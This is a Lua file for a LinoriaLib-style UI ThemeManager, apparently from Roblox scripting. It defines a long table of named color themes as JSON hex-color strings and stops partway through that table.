local httpService = game:GetService('HttpService')
local ThemeManager = {} do
	ThemeManager.Folder = 'LinoriaLibSettings'
	-- if not isfolder(ThemeManager.Folder) then makefolder(ThemeManager.Folder) end
	
	ThemeManager.Library = nil
ThemeManager.BuiltInThemes = {
	['Wattyhub Default'] = { 1, httpService:JSONDecode('{"FontColor":"ffffff","MainColor":"1e1a21","AccentColor":"715c8f","BackgroundColor":"141414","OutlineColor":"403352"}') },
	['Bloodmoon Bleh']   = { 2, httpService:JSONDecode('{"FontColor":"ffffff","MainColor":"291010","AccentColor":"b73c3c","BackgroundColor":"201e1e","OutlineColor":"8e5252"}') },
	['JJSploit']         = { 3, httpService:JSONDecode('{"FontColor":"ffffff","MainColor":"01ddff","AccentColor":"48badf","BackgroundColor":"369ec2","OutlineColor":"000000"}') },
	['BBot'] 			 = { 4, httpService:JSONDecode('{"FontColor":"ffffff","MainColor":"1e1e1e","AccentColor":"7e48a3","BackgroundColor":"232323","OutlineColor":"141414"}') },
	['Fatality']		 = { 5, httpService:JSONDecode('{"FontColor":"ffffff","MainColor":"1e1842","AccentColor":"c50754","BackgroundColor":"191335","OutlineColor":"3c355d"}') },
	['Jester'] 			 = { 6, httpService:JSONDecode('{"FontColor":"ffffff","MainColor":"242424","AccentColor":"db4467","BackgroundColor":"1c1c1c","OutlineColor":"373737"}') },
	['Mint'] 			 = { 7, httpService:JSONDecode('{"FontColor":"ffffff","MainColor":"242424","AccentColor":"3db488","BackgroundColor":"1c1c1c","OutlineColor":"373737"}') },
	['Tokyo Night'] 	 = { 8, httpService:JSONDecode('{"FontColor":"ffffff","MainColor":"191925","AccentColor":"6759b3","BackgroundColor":"16161f","OutlineColor":"323232"}') },
	['Ubuntu'] 			 = { 9, httpService:JSONDecode('{"FontColor":"ffffff","MainColor":"3e3e3e","AccentColor":"e2581e","BackgroundColor":"323232","OutlineColor":"191919"}') },
	['Quartz'] 			 = { 10, httpService:JSONDecode('{"FontColor":"ffffff","MainColor":"232330","AccentColor":"426e87","BackgroundColor":"1d1b26","OutlineColor":"27232f"}') },
	['Forest Canopy'] 	 = { 11, httpService:JSONDecode('{"FontColor":"f0f0f0","MainColor":"2A3D2A","AccentColor":"6A822D","BackgroundColor":"1E2D1E","OutlineColor":"3E523E"}') },
	['Oceanic Deep'] 	 = { 12, httpService:JSONDecode('{"FontColor":"E0F2F7","MainColor":"0B3C4D","AccentColor":"18A3B8","BackgroundColor":"04222E","OutlineColor":"1A5366"}') },
	['Sunset Glow'] 	 = { 13, httpService:JSONDecode('{"FontColor":"FFE5CC","MainColor":"2B1E43","AccentColor":"E8774D","BackgroundColor":"1F1633","OutlineColor":"593C81"}') },
	['Arctic Frost'] 	 = { 14, httpService:JSONDecode('{"FontColor":"1a1a1a","MainColor":"dbe9f4","AccentColor":"6c92b8","BackgroundColor":"c4d7e8","OutlineColor":"a8bfd4"}') },
	['Desert Oasis']     = { 15, httpService:JSONDecode('{"FontColor":"3D2C1D","MainColor":"F0E68C","AccentColor":"4682B4","BackgroundColor":"E6D9B9","OutlineColor":"C2B280"}') },
	['Bloxy Cola'] 		 = { 16, httpService:JSONDecode('{"FontColor":"FFFFFF","MainColor":"2E1A1A","AccentColor":"D92C2C","BackgroundColor":"1F1212","OutlineColor":"503030"}') },
	['Classic Roblox'] 	 = { 17, httpService:JSONDecode('{"FontColor":"FFFFFF","MainColor":"393B3D","AccentColor":"DA291C","BackgroundColor":"2D2F31","OutlineColor":"18191A"}') },
	['Phantom Forces'] 	 = { 18, httpService:JSONDecode('{"FontColor":"ECECEC","MainColor":"2D302B","AccentColor":"BFB8A3","BackgroundColor":"1E201C","OutlineColor":"40443B"}') },
	['Jailbreak Heist']  = { 19, httpService:JSONDecode('{"FontColor":"FFFFFF","MainColor":"2D2D2D","AccentColor":"FFA500","BackgroundColor":"202020","OutlineColor":"F5C542"}') },
	['Discord Blurple']  = { 20, httpService:JSONDecode('{"FontColor":"FFFFFF","MainColor":"2C2F33","AccentColor":"5865F2","BackgroundColor":"23272A","OutlineColor":"40444B"}') },
	['Spotify Vibes'] 	 = { 21, httpService:JSONDecode('{"FontColor":"FFFFFF","MainColor":"191414","AccentColor":"1DB954","BackgroundColor":"121212","OutlineColor":"282828"}') },
	['GitHub Dark'] 	 = { 22, httpService:JSONDecode('{"FontColor":"c9d1d9","MainColor":"161b22","AccentColor":"58a6ff","BackgroundColor":"0d1117","OutlineColor":"30363d"}') },
	['Cyberpunk Neon'] 	 = { 23, httpService:JSONDecode('{"FontColor":"FFFFFF","MainColor":"1A1A2A","AccentColor":"F900F2","BackgroundColor":"0D0D1A","OutlineColor":"3D008D"}') },
	['Royal Amethyst'] 	 = { 24, httpService:JSONDecode('{"FontColor":"FAEBD7","MainColor":"2C1F3A","AccentColor":"D4AF37","BackgroundColor":"1E152A","OutlineColor":"483D8B"}') },
	['Solarized Dark'] 	 = { 25, httpService:JSONDecode('{"FontColor":"839496","MainColor":"073642","AccentColor":"268BD2","BackgroundColor":"002B36","OutlineColor":"586E75"}') },
	['Dracula'] 		 = { 26, httpService:JSONDecode('{"FontColor":"f8f8f2","MainColor":"282a36","AccentColor":"bd93f9","BackgroundColor":"20222b","OutlineColor":"44475a"}') },
	['Rose Gold'] 		 = { 27, httpService:JSONDecode('{"FontColor":"3D2B2F","MainColor":"F7E9E3","AccentColor":"D8AFA0","BackgroundColor":"F4E2DA","OutlineColor":"B99080"}') },
	['Nordic Peace']     = { 28, httpService:JSONDecode('{"FontColor":"2E3440","MainColor":"ECEFF4","AccentColor":"88C0D0","BackgroundColor":"E5E9F0","OutlineColor":"D8DEE9"}') },
	['Crimson Court']    = { 29, httpService:JSONDecode('{"FontColor":"EAEAEA","MainColor":"1A0000","AccentColor":"DC143C","BackgroundColor":"100000","OutlineColor":"8B0000"}') },
	['Emerald Tablet']   = { 30, httpService:JSONDecode('{"FontColor":"E0F2E9","MainColor":"0A2A1B","AccentColor":"34D17A","BackgroundColor":"051A11","OutlineColor":"1A4A31"}') },
	['8-Bit Summer']     = { 31, httpService:JSONDecode('{"FontColor":"FFFFFF","MainColor":"3A248A","AccentColor":"F76E5E","BackgroundColor":"2C1B68","OutlineColor":"FFD800"}') },
	['Graphite & Gold']  = { 32, httpService:JSONDecode('{"FontColor":"E5E5E5","MainColor":"222222","AccentColor":"D4AF37","BackgroundColor":"181818","OutlineColor":"333333"}') },
	['Bubblegum Pop']    = { 33, httpService:JSONDecode('{"FontColor":"2F2F2F","MainColor":"FFDDF4","AccentColor":"FF69B4","BackgroundColor":"FFEBF7","OutlineColor":"F4B2D8"}') },
	['Greenshirtguyidk'] = { 34, httpService:JSONDecode('{"FontColor":"FFFFFF","MainColor":"3D523B","AccentColor":"5DBB5B","BackgroundColor":"2A3828","OutlineColor":"1E291D"}') },
	['dood3\'s Dominion'] = { 35, httpService:JSONDecode('{"FontColor":"FFFFFF","MainColor":"4B0F0F","AccentColor":"FF3333","BackgroundColor":"2C0A0A","OutlineColor":"8B2323"}') },
	['Mysterious Mustache'] = { 36, httpService:JSONDecode('{"FontColor":"E6D7B9","MainColor":"3D2B1F","AccentColor":"C2B280","BackgroundColor":"251B14","OutlineColor":"5A4D3C"}') },
	['Keith\'s Rampage']  = { 37, httpService:JSONDecode('{"FontColor":"F5F5F5","MainColor":"1C1C1C","AccentColor":"E50000","BackgroundColor":"0F0F0F","OutlineColor":"FF4500"}') },
	['Generic Roleplay'] = { 38, httpService:JSONDecode('{"FontColor":"222222","MainColor":"A0D9EF","AccentColor":"F44336","BackgroundColor":"87CEEB","OutlineColor":"736357"}') },
	['Typical Neighborhood'] = { 39, httpService:JSONDecode('{"FontColor":"1A1A1A","MainColor":"F0F0F0","AccentColor":"FFA726","BackgroundColor":"E0E0E0","OutlineColor":"BDBDBD"}') },
	['Tiger Stripes']    = { 40, httpService:JSONDecode('{"FontColor":"FFFFFF","MainColor":"1C1C1C","AccentColor":"FF6600","BackgroundColor":"121212","OutlineColor":"D95400"}') },
	['Peacock Plume']    = { 41, httpService:JSONDecode('{"FontColor":"E0F2F7","MainColor":"004D40","AccentColor":"00BFA5","BackgroundColor":"00382E","OutlineColor":"00695C"}') },
	['Panda Bamboo']     = { 42, httpService:JSONDecode('{"FontColor":"1E1E1E","MainColor":"F5F5F5","AccentColor":"4CAF50","BackgroundColor":"E8E8E8","OutlineColor":"A5D6A7"}') },
	['Poison Dart Frog'] = { 43, httpService:JSONDecode('{"FontColor":"FFFFFF","MainColor":"111111","AccentColor":"29B6F6","BackgroundColor":"0A0A0A","OutlineColor":"03A9F4"}') },
	['Arctic Fox']       = { 44, httpService:JSONDecode('{"FontColor":"37474F","MainColor":"ECEFF1","AccentColor":"81D4FA","BackgroundColor":"CFD8DC","OutlineColor":"90A4AE"}') },
	['Jungle Python']    = { 45, httpService:JSONDecode('{"FontColor":"FFF59D","MainColor":"333300","AccentColor":"BFB300","BackgroundColor":"242400","OutlineColor":"5C5C00"}') },
	['Synapse X']        = { 46, httpService:JSONDecode('{"FontColor":"FFFFFF","MainColor":"2C2C2C","AccentColor":"8BC34A","BackgroundColor":"222222","OutlineColor":"383838"}') },
	['Krnl']             = { 47, httpService:JSONDecode('{"FontColor":"FFFFFF","MainColor":"1F2937","AccentColor":"3B82F6","BackgroundColor":"111827","OutlineColor":"374151"}') },
	['Script-Ware']      = { 48, httpService:JSONDecode('{"FontColor":"FFFFFF","MainColor":"1E1B2E","AccentColor":"9F7AEA","BackgroundColor":"141221","OutlineColor":"3C3264"}') },
	['Cherry Blossom']   = { 49, httpService:JSONDecode('{"FontColor":"3B3B3B","MainColor":"FFB7C5","AccentColor":"F472B6","BackgroundColor":"FFE4E1","OutlineColor":"E6A8B4"}') },
	['Volcanic Ash']     = { 50, httpService:JSONDecode('{"FontColor":"F5F5F5","MainColor":"4A4A4A","AccentColor":"FF4500","BackgroundColor":"363636","OutlineColor":"282828"}') },
	['Northern Lights']  = { 51, httpService:JSONDecode('{"FontColor":"FFFFFF","MainColor":"0E132F","AccentColor":"14F195","BackgroundColor":"080C21","OutlineColor":"26D3A0"}') },
	['Coral Reef']       = { 52, httpService:JSONDecode('{"FontColor":"1E1E1E","MainColor":"84DCC6","AccentColor":"FF6B6B","BackgroundColor":"A5FFD6","OutlineColor":"6ABCA8"}') },
	['Monarch Butterfly'] = { 53, httpService:JSONDecode('{"FontColor":"FFFFFF","MainColor":"3D3D3D","AccentColor":"F97B22","BackgroundColor":"1C1C1C","OutlineColor":"D45D00"}') },
	['Flamingo']         = { 54, httpService:JSONDecode('{"FontColor":"2F4F4F","MainColor":"FFDFDD","AccentColor":"FC8EAC","BackgroundColor":"FFF0F5","OutlineColor":"F9C0D3"}') },
	['Twitch']           = { 55, httpService:JSONDecode('{"FontColor":"FFFFFF","MainColor":"2C2541","AccentColor":"9147FF","BackgroundColor":"18181B","OutlineColor":"6A3EBE"}') },
	['YouTube']          = { 56, httpService:JSONDecode('{"FontColor":"FFFFFF","MainColor":"282828","AccentColor":"FF0000","BackgroundColor":"181818","OutlineColor":"383838"}') },
	['Reddit']           = { 57, httpService:JSONDecode('{"FontColor":"1A1A1B","MainColor":"FFFFFF","AccentColor":"FF4500","BackgroundColor":"DAE0E6","OutlineColor":"D3D5D7"}') },
	['Strawberry Cream'] = { 58, httpService:JSONDecode('{"FontColor":"3A1C22","MainColor":"FCD5CE","AccentColor":"E75480","BackgroundColor":"FFF0F1","OutlineColor":"F8B5AC"}') },
	['Matcha Latte']     = { 59, httpService:JSONDecode('{"FontColor":"3A3D3B","MainColor":"C2D5C4","AccentColor":"88B04B","BackgroundColor":"EAF0E9","OutlineColor":"AEC2AE"}') },
	['Dark Chocolate']   = { 60, httpService:JSONDecode('{"FontColor":"FFFFFF","MainColor":"3D2B1F","AccentColor":"7B3F00","BackgroundColor":"1E150F","OutlineColor":"5A4D3C"}') },
	['Coca-Cola']        = { 61, httpService:JSONDecode('{"FontColor":"1E0000","MainColor":"FFFFFF","AccentColor":"F40009","BackgroundColor":"EAEAEA","OutlineColor":"BEBEBE"}') },
	['Taco Bell']        = { 62, httpService:JSONDecode('{"FontColor":"FFFFFF","MainColor":"3C1B5D","AccentColor":"FFBD4A","BackgroundColor":"1E0D34","OutlineColor":"A438B3"}') },
	['Doritos']          = { 63, httpService:JSONDecode('{"FontColor":"FFFFFF","MainColor":"2D2D2D","AccentColor":"F9461C","BackgroundColor":"1A1A1A","OutlineColor":"FF7F50"}') },
	['Razer Chroma']     = { 64, httpService:JSONDecode('{"FontColor":"FFFFFF","MainColor":"1A1A1A","AccentColor":"00FF00","BackgroundColor":"0D0D0D","OutlineColor":"444444"}') },
	['Steam']            = { 65, httpService:JSONDecode('{"FontColor":"E1E3E6","MainColor":"1B2838","AccentColor":"66C0F4","BackgroundColor":"171A21","OutlineColor":"2A475E"}') },
	['PlayStation']      = { 66, httpService:JSONDecode('{"FontColor":"FFFFFF","MainColor":"003087","AccentColor":"006FCD","BackgroundColor":"001C4F","OutlineColor":"2E5A9E"}') },
	['Xbox']             = { 67, httpService:JSONDecode('{"FontColor":"FFFFFF","MainColor":"1F1F1F","AccentColor":"107C10","BackgroundColor":"151515","OutlineColor":"343434"}') },
	['Denim Jacket']     = { 68, httpService:JSONDecode('{"FontColor":"FFFFFF","MainColor":"3E6489","AccentColor":"FDB813","BackgroundColor":"2A4B6F","OutlineColor":"5A82AC"}') },
	['Terracotta Pot']   = { 69, httpService:JSONDecode('{"FontColor":"FFFFFF","MainColor":"B25C4D","AccentColor":"D98A7B","BackgroundColor":"8C4333","OutlineColor":"9E5040"}') },
	['Old Library Book'] = { 70, httpService:JSONDecode('{"FontColor":"402C1F","MainColor":"FDF5E6","AccentColor":"A0522D","BackgroundColor":"F5DEB3","OutlineColor":"D2B48C"}') },
	['VHS Static']       = { 71, httpService:JSONDecode('{"FontColor":"FFFFFF","MainColor":"252525","AccentColor":"00A8A8","BackgroundColor":"151515","OutlineColor":"FF00FF"}') },
	['Molten Core']      = { 72, httpService:JSONDecode('{"FontColor":"FFFFFF","MainColor":"330A00","AccentColor":"FF8C00","BackgroundColor":"1A0500","OutlineColor":"FF4500"}') },
	['Glacial Ice']      = { 73, httpService:JSONDecode('{"FontColor":"1A2A3A","MainColor":"BEE9F7","AccentColor":"81D4FA","BackgroundColor":"E1F5FE","OutlineColor":"A6D8EE"}') },
	['Pure Gold']        = { 74, httpService:JSONDecode('{"FontColor":"1E1B00","MainColor":"FFD700","AccentColor":"FFDF33","BackgroundColor":"332C00","OutlineColor":"BF9B00"}') },
	['Graveyard Fog']    = { 75, httpService:JSONDecode('{"FontColor":"EAEAEA","MainColor":"4A545A","AccentColor":"778899","BackgroundColor":"2F363B","OutlineColor":"697A87"}') },
	['Slaughterhouse']   = { 76, httpService:JSONDecode('{"FontColor":"1A0000","MainColor":"D3D3D3","AccentColor":"8B0000","BackgroundColor":"FFFFFF","OutlineColor":"A9A9A9"}') },
	['Eldritch Horror']  = { 77, httpService:JSONDecode('{"FontColor":"C3A3FF","MainColor":"1D0F2E","AccentColor":"6A0DAD","BackgroundColor":"0F0817","OutlineColor":"4B0082"}') },
	['Zombie Flesh']     = { 78, httpService:JSONDecode('{"FontColor":"FFFFFF","MainColor":"556B2F","AccentColor":"8B4513","BackgroundColor":"3B4A21","OutlineColor":"6B8E23"}') },
	['Asiimov']          = { 79, httpService:JSONDecode('{"FontColor":"1A1A1A","MainColor":"FFFFFF","AccentColor":"F97B22","BackgroundColor":"EAEAEA","OutlineColor":"999999"}') },
	['Desert Eagle Blaze'] = { 80, httpService:JSONDecode('{"FontColor":"FFFFFF","MainColor":"222222","AccentColor":"FFD700","BackgroundColor":"111111","OutlineColor":"FF8C00"}') },
	['Digital Camo']     = { 81, httpService:JSONDecode('{"FontColor":"FFFFFF","MainColor":"555544","AccentColor":"888877","BackgroundColor":"333322","OutlineColor":"ADAD99"}') },
	['Damascus Steel']   = { 82, httpService:JSONDecode('{"FontColor":"EAEAEA","MainColor":"404040","AccentColor":"808080","BackgroundColor":"202020","OutlineColor":"606060"}') },
	['Super Mario']      = { 83, httpService:JSONDecode('{"FontColor":"FFFFFF","MainColor":"E52521","AccentColor":"049CD8","BackgroundColor":"3A3A3A","OutlineColor":"FBD000"}') },
	['Zelda']            = { 84, httpService:JSONDecode('{"FontColor":"FFFFFF","MainColor":"003A2B","AccentColor":"D4AF37","BackgroundColor":"002A1F","OutlineColor":"296E5C"}') },
	['Halo']             = { 85, httpService:JSONDecode('{"FontColor":"FFFFFF","MainColor":"1E4A60","AccentColor":"74B24B","BackgroundColor":"0F2530","OutlineColor":"4A788E"}') },
	['Minecraft Creeper'] = { 86, httpService:JSONDecode('{"FontColor":"FFFFFF","MainColor":"0A590A","AccentColor":"2F9E2F","BackgroundColor":"053005","OutlineColor":"1D781D"}') },
	['Portal']           = { 87, httpService:JSONDecode('{"FontColor":"111111","MainColor":"F0F0F0","AccentColor":"FF6600","BackgroundColor":"DEDEDE","OutlineColor":"00529B"}') },
	['Vaporwave']        = { 88, httpService:JSONDecode('{"FontColor":"FFFFFF","MainColor":"2C2C54","AccentColor":"FF6AD5","BackgroundColor":"1F1F3D","OutlineColor":"00D2FF"}') },
	['Doge']             = { 89, httpService:JSONDecode('{"FontColor":"1C1C1C","MainColor":"FFEAB9","AccentColor":"3498DB","BackgroundColor":"FFF2D6","OutlineColor":"D4AF37"}') },
	['Wojak']            = { 90, httpService:JSONDecode('{"FontColor":"000000","MainColor":"FFFFFF","AccentColor":"BABABA","BackgroundColor":"E0E0E0","OutlineColor":"808080"}') },
	['Stonks']           = { 91, httpService:JSONDecode('{"FontColor":"FFFFFF","MainColor":"373737","AccentColor":"26A69A","BackgroundColor":"1E1E1E","OutlineColor":"00ACC1"}') },
	['Red Panda']        = { 92, httpService:JSONDecode('{"FontColor":"FFFFFF","MainColor":"A8432A","AccentColor":"F0EBE6","BackgroundColor":"4D2A25","OutlineColor":"CD664A"}') },
	['Blue Jay']         = { 93, httpService:JSONDecode('{"FontColor":"1C1C1C","MainColor":"FFFFFF","AccentColor":"0077C8","BackgroundColor":"F0F8FF","OutlineColor":"77ADD9"}') },
	['Chameleon']        = { 94, httpService:JSONDecode('{"FontColor":"FFFFFF","MainColor":"4D8C43","AccentColor":"E5C100","BackgroundColor":"2C5E2C","OutlineColor":"F97B22"}') },
	['Orca']             = { 95, httpService:JSONDecode('{"FontColor":"EAEAEA","MainColor":"000000","AccentColor":"FFFFFF","BackgroundColor":"1C1C1C","OutlineColor":"333333"}') },
	['PewDiePie']        = { 96, httpService:JSONDecode('{"FontColor":"FFFFFF","MainColor":"1E1E1E","AccentColor":"E62117","BackgroundColor":"0A0A0A","OutlineColor":"3C3C3C"}') },
	['MrBeast']          = { 97, httpService:JSONDecode('{"FontColor":"FFFFFF","MainColor":"0077C8","AccentColor":"F472B6","BackgroundColor":"005FA3","OutlineColor":"40A3D9"}') },
	['Markiplier']       = { 98, httpService:JSONDecode('{"FontColor":"FFFFFF","MainColor":"1D1D1D","AccentColor":"FF7DD5","BackgroundColor":"131313","OutlineColor":"331E2A"}') },
	['Jacksepticeye']    = { 99, httpService:JSONDecode('{"FontColor":"FFFFFF","MainColor":"1D3A2F","AccentColor":"32CD32","BackgroundColor":"12251E","OutlineColor":"285C42"}') },
	['Linus Tech Tips']  = { 100, httpService:JSONDecode('{"FontColor":"FFFFFF","MainColor":"2A2A2E","AccentColor":"F77D00","BackgroundColor":"1E1E21","OutlineColor":"4A4A50"}') },
	['Dream']            = { 101, httpService:JSONDecode('{"FontColor":"1A1A1A","MainColor":"FFFFFF","AccentColor":"8BC34A","BackgroundColor":"E8F5E9","OutlineColor":"C8E6C9"}') },
	['Technoblade']      = { 102, httpService:JSONDecode('{"FontColor":"FFFFFF","MainColor":"4B0000","AccentColor":"FF69B4","BackgroundColor":"2E0000","OutlineColor":"D4AF37"}') },
	['Corpse Husband']   = { 103, httpService:JSONDecode('{"FontColor":"F5F5F5","MainColor":"0A0A0A","AccentColor":"8B0000","BackgroundColor":"000000","OutlineColor":"3D0000"}') },
	['Valkyrae']         = { 104, httpService:JSONDecode('{"FontColor":"FFFFFF","MainColor":"111111","AccentColor":"D42A33","BackgroundColor":"080808","OutlineColor":"333333"}') },
	['Pokimane']         = { 105, httpService:JSONDecode('{"FontColor":"2F3C4F","MainColor":"E1E8FF","AccentColor":"90A4FF","BackgroundColor":"F0F3FF","OutlineColor":"C0CBFF"}') },
	['MoistCr1TiKaL']    = { 106, httpService:JSONDecode('{"FontColor":"000000","MainColor":"FFFFFF","AccentColor":"808080","BackgroundColor":"EAEAEA","OutlineColor":"000000"}') },
	['Ludwig']           = { 107, httpService:JSONDecode('{"FontColor":"FFFFFF","MainColor":"323232","AccentColor":"FF4500","BackgroundColor":"212121","OutlineColor":"545454"}') },
	['Gawr Gura']        = { 108, httpService:JSONDecode('{"FontColor":"FFFFFF","MainColor":"2E5A8D","AccentColor":"FFFFFF","BackgroundColor":"1D426B","OutlineColor":"5585B8"}') },
	['Wirtual']          = { 109, httpService:JSONDecode('{"FontColor":"FFFFFF","MainColor":"1A1A1A","AccentColor":"FFEA00","BackgroundColor":"101010","OutlineColor":"4A4A4A"}') },
	['xQc']              = { 110, httpService:JSONDecode('{"FontColor":"FFFFFF","MainColor":"252525","AccentColor":"B2FF00","BackgroundColor":"151515","OutlineColor":"FFFF00"}') },
	['Elden Ring']       = { 111, httpService:JSONDecode('{"FontColor":"FFEBCD","MainColor":"201E1A","AccentColor":"D4AF37","BackgroundColor":"161411","OutlineColor":"4D422E"}') },
	['Valorant']         = { 112, httpService:JSONDecode('{"FontColor":"ECECEC","MainColor":"1C1C1C","AccentColor":"FD4556","BackgroundColor":"0F1923","OutlineColor":"BD3944"}') },
	['The Witcher']      = { 113, httpService:JSONDecode('{"FontColor":"EAEAEA","MainColor":"2F2F2F","AccentColor":"DC143C","BackgroundColor":"1A1A1A","OutlineColor":"5A5A5A"}') },
	['Hollow Knight']    = { 114, httpService:JSONDecode('{"FontColor":"F5F5F5","MainColor":"0E1020","AccentColor":"FF6A00","BackgroundColor":"070811","OutlineColor":"3A3D5E"}') },
	['Stardew Valley']   = { 115, httpService:JSONDecode('{"FontColor":"5A3A25","MainColor":"FADF9C","AccentColor":"6AAB35","BackgroundColor":"FFEEC4","OutlineColor":"B48A4F"}') },
	['Genshin Impact']   = { 116, httpService:JSONDecode('{"FontColor":"3A3A3A","MainColor":"F4F0E8","AccentColor":"60C0E5","BackgroundColor":"EAE6DA","OutlineColor":"B7A890"}') },
	['Doom Eternal']     = { 117, httpService:JSONDecode('{"FontColor":"FFFFFF","MainColor":"282828","AccentColor":"B51616","BackgroundColor":"1E1E1E","OutlineColor":"8B0000"}') },
	['Apex Legends']     = { 118, httpService:JSONDecode('{"FontColor":"FFFFFF","MainColor":"252525","AccentColor":"DA292A","BackgroundColor":"1A1A1A","OutlineColor":"444444"}') },
	['Overwatch']        = { 119, httpService:JSONDecode('{"FontColor":"1A1A1A","MainColor":"F9F9F9","AccentColor":"F99E1A","BackgroundColor":"EAEAEA","OutlineColor":"007ACC"}') },
	['Sea of Thieves']   = { 120, httpService:JSONDecode('{"FontColor":"F5EAC9","MainColor":"1B4A5A","AccentColor":"1DB193","BackgroundColor":"0E3542","OutlineColor":"3A7285"}') },
	['Deep Rock Galactic'] = { 121, httpService:JSONDecode('{"FontColor":"F5F5F5","MainColor":"253545","AccentColor":"FBB513","BackgroundColor":"15202B","OutlineColor":"4A688A"}') },
	['Rust']             = { 122, httpService:JSONDecode('{"FontColor":"FFFFFF","MainColor":"4E3A2E","AccentColor":"CD412B","BackgroundColor":"3A2C23","OutlineColor":"6F5243"}') },
	['Phasmophobia']     = { 123, httpService:JSONDecode('{"FontColor":"EAEAEA","MainColor":"101010","AccentColor":"7FFF00","BackgroundColor":"000000","OutlineColor":"303030"}') },
	['Fallout']          = { 124, httpService:JSONDecode('{"FontColor":"9CFF9C","MainColor":"2A2A2A","AccentColor":"4A8A4A","BackgroundColor":"1A1A1A","OutlineColor":"003300"}') },
	['The Sims']         = { 125, httpService:JSONDecode('{"FontColor":"FFFFFF","MainColor":"39A2AE","AccentColor":"88D44B","BackgroundColor":"2A7880","OutlineColor":"55C1C1"}') },
	['TikTok']           = { 126, httpService:JSONDecode('{"FontColor":"FFFFFF","MainColor":"1A1A1A","AccentColor":"EE1D52","BackgroundColor":"0A0A0A","OutlineColor":"25F4EE"}') },
	['Instagram']        = { 127, httpService:JSONDecode('{"FontColor":"FFFFFF","MainColor":"2E1A3D","AccentColor":"E1306C","BackgroundColor":"1A0E2A","OutlineColor":"FD1D1D"}') },
	['Twitter/X']        = { 128, httpService:JSONDecode('{"FontColor":"E7E9EA","MainColor":"151515","AccentColor":"FFFFFF","BackgroundColor":"0A0A0A","OutlineColor":"2F3336"}') },
	['ChatGPT']          = { 129, httpService:JSONDecode('{"FontColor":"FFFFFF","MainColor":"343541","AccentColor":"10A37F","BackgroundColor":"202123","OutlineColor":"444654"}') },
	['Tesla']            = { 130, httpService:JSONDecode('{"FontColor":"F5F5F5","MainColor":"222222","AccentColor":"E82127","BackgroundColor":"181818","OutlineColor":"333333"}') },
	['Lo-fi Beats']      = { 131, httpService:JSONDecode('{"FontColor":"F5E6CC","MainColor":"3D315B","AccentColor":"DB5461","BackgroundColor":"2A2240","OutlineColor":"5A4D8C"}') },
	['Synthwave']        = { 132, httpService:JSONDecode('{"FontColor":"00F2EA","MainColor":"250C3A","AccentColor":"F92A82","BackgroundColor":"1A0829","OutlineColor":"7C1F8F"}') },
	['Star Wars Jedi']   = { 133, httpService:JSONDecode('{"FontColor":"FFFFFF","MainColor":"1D1D1D","AccentColor":"00A8F3","BackgroundColor":"0A0A0A","OutlineColor":"3366CC"}') },
	['Star Wars Sith']   = { 134, httpService:JSONDecode('{"FontColor":"FFFFFF","MainColor":"1D1D1D","AccentColor":"F90029","BackgroundColor":"0A0A0A","OutlineColor":"990000"}') },
	['Dune']             = { 135, httpService:JSONDecode('{"FontColor":"E6D8B9","MainColor":"3A2E25","AccentColor":"D48842","BackgroundColor":"251E18","OutlineColor":"6B5848"}') },
	['Lord of the Rings'] = { 136, httpService:JSONDecode('{"FontColor":"FFF5E1","MainColor":"1A3A1A","AccentColor":"D4AF37","BackgroundColor":"0D2A0D","OutlineColor":"3D6B3D"}') },
	['Warhammer 40k']    = { 137, httpService:JSONDecode('{"FontColor":"F5DEB3","MainColor":"2E251E","AccentColor":"B8860B","BackgroundColor":"1A1510","OutlineColor":"5A422D"}') },
	['Halloween']        = { 138, httpService:JSONDecode('{"FontColor":"FFFFFF","MainColor":"1A1A1A","AccentColor":"FF6600","BackgroundColor":"0A0A0A","OutlineColor":"4B0082"}') },
	['Christmas']        = { 139, httpService:JSONDecode('{"FontColor":"FFFFFF","MainColor":"B22222","AccentColor":"006400","BackgroundColor":"8B0000","OutlineColor":"FFD700"}') },
	['Valentine']        = { 140, httpService:JSONDecode('{"FontColor":"1A1A1A","MainColor":"FFFFFF","AccentColor":"FF1493","BackgroundColor":"FFC0CB","OutlineColor":"E6E6E6"}') },
	['St. Patrick\'s Day'] = { 141, httpService:JSONDecode('{"FontColor":"FFFFFF","MainColor":"006400","AccentColor":"FFD700","BackgroundColor":"004D00","OutlineColor":"008000"}') },
	['Pepsi']            = { 142, httpService:JSONDecode('{"FontColor":"FFFFFF","MainColor":"00529C","AccentColor":"E51937","BackgroundColor":"003B71","OutlineColor":"FFFFFF"}') },
	['Mountain Dew']     = { 143, httpService:JSONDecode('{"FontColor":"1A1A1A","MainColor":"33CC33","AccentColor":"CC0000","BackgroundColor":"009900","OutlineColor":"FFFFFF"}') },
	['Dr. Pepper']       = { 144, httpService:JSONDecode('{"FontColor":"FFFFFF","MainColor":"5A030C","AccentColor":"E6D7B9","BackgroundColor":"3D0208","OutlineColor":"8B0A15"}') },
	['Pizza Hut']        = { 145, httpService:JSONDecode('{"FontColor":"FFFFFF","MainColor":"2A2A2A","AccentColor":"EE3A43","BackgroundColor":"1A1A1A","OutlineColor":"000000"}') },
	['G-FUEL']           = { 146, httpService:JSONDecode('{"FontColor":"FFFFFF","MainColor":"2A2A2A","AccentColor":"50E23C","BackgroundColor":"1A1A1A","OutlineColor":"F9004A"}') },
	['Starbucks']        = { 147, httpService:JSONDecode('{"FontColor":"FFFFFF","MainColor":"006241","AccentColor":"FFFFFF","BackgroundColor":"004A31","OutlineColor":"CBA258"}') },
	['Blueberry']        = { 148, httpService:JSONDecode('{"FontColor":"F5F5F5","MainColor":"3A4D8F","AccentColor":"6E85D4","BackgroundColor":"28366A","OutlineColor":"5D74C3"}') },
	['Watermelon']       = { 149, httpService:JSONDecode('{"FontColor":"FFFFFF","MainColor":"FB4B4E","AccentColor":"3A3A3A","BackgroundColor":"FD6F71","OutlineColor":"4AAB25"}') },
	['Lemon Lime']       = { 150, httpService:JSONDecode('{"FontColor":"1A1A1A","MainColor":"E2F705","AccentColor":"3EB489","BackgroundColor":"F2FF7A","OutlineColor":"B0C504"}') },
	['Orange Soda']      = { 151, httpService:JSONDecode('{"FontColor":"FFFFFF","MainColor":"F9690E","AccentColor":"FFFFFF","BackgroundColor":"E05000","OutlineColor":"FF9833"}') },
	['Carbon Fiber']     = { 152, httpService:JSONDecode('{"FontColor":"EAEAEA","MainColor":"282828","AccentColor":"888888","BackgroundColor":"181818","OutlineColor":"404040"}') },
	['Polished Chrome']  = { 153, httpService:JSONDecode('{"FontColor":"1A1A1A","MainColor":"EAEAEA","AccentColor":"FFFFFF","BackgroundColor":"D0D0D0","OutlineColor":"BABABA"}') },
